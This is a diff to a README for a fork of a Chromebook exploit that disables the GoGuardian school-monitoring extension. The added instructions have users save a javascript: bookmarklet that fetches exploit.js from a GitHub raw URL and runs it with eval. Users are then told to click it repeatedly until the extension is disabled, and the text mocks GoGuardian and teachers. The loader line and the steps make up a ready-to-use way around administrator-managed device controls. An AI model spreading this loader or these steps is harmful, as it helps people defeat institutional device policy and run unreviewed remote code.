@@ -1,3 +1,31 @@
+# **THIS IS A FORK OF THE ORIGINAL EXPLOIT LTBEEF, MADE BY BYPASSI AND 3kh0!**
+# **ORIGINAL INSTRUCTIONS FOUND BELOW**
+
+This is a mod of ext-remover that targets GoGuardian, a shit spyware app that has been know to let "teachers" [spy on the users](https://chicago.suntimes.com/education/2020/10/5/21497946/cps-public-schools-go-guardian-technology-privacy-remote-learning)
+
+## Instructions
+
+entire right click bookmark bar and click Add page...
+• set Name: to whatever you want, i recommend just naming it spam
+• set URL: to 
+
+> javascript:fetch(`https://raw.githubusercontent.com/rice-a-rona/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+
+• click Save
+
+2. Using
+
+• spam click the bookmark you just made
+• do not stop until you get the message
+```Web Store
+Go Guardians ass has been blasted```
+or similar
+
+3. That's it 
+
+- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+
 # ext remover
 
 ![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)
